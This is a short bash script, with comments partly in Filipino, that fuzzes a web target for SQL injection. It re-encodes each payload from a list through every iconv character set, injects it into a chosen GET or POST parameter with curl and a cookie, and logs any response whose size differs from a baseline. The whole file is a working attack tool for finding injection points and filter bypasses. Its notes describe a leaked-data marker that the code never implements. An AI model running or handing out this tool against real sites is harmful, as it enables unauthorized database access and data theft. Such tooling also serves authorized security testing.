#!/bin/bash

#
# Usage: ./sqli_leak.sh <target link> <payload list filename> <data> <method - "get/post"> <output filename> <normal count> <cookie>
# 
# Notes:
# 1) data - Set yung paremeter sa X para mafuzz. E.g. id=X, username=X&password=X, post=X. Kung hindi ifufuzz, lagyan lang ng kahit ano wag lang "X". E.g. username=X&password=password
# 2) marker string - If database did not crash a from a payload but triggered an sqli that leaks data, marker string is the data that is leaked. 
# 			The program will find marker string from the response html#


URL=$1
filename=$2
data=$3
method=$4
output_file=$5
normal_count=$6
cookie=$7

count=0

while read line;
do
	for value in $(iconv -l | tail -n+5 | sed "s/\/\///g"); 
	do 
		echo [*] - $value; 
		to_send=$(echo -e "$line" | iconv -t $value); 
		
		#Changing the data
		to_send=$(echo $data | sed "s/X/$(printf "%q" "$to_send")/g");

		if [[ $method == *"post"* ]];
		then
			result=$(curl $URL --data "$to_send" --cookie "$cookie"| wc -c);
		
		else
			result=$(curl "$URL/?$to_send" --cookie "$cookie" | wc -c);
		fi

		echo $to_send;

		echo $result;	
	
		if [[ $result != $normal_count ]];
		then
			echo [+] - $value >> $output_file;
			echo [+] - $to_send >> $output_file;
			echo "" - >> $output_file; 
			let count=$count+1
		fi 
	done 
done < $filename


let total=$(iconv -l | wc -l)*$(cat $filename | wc -l);
echo "[*] $count out of "$total" worked" >> $output_file;
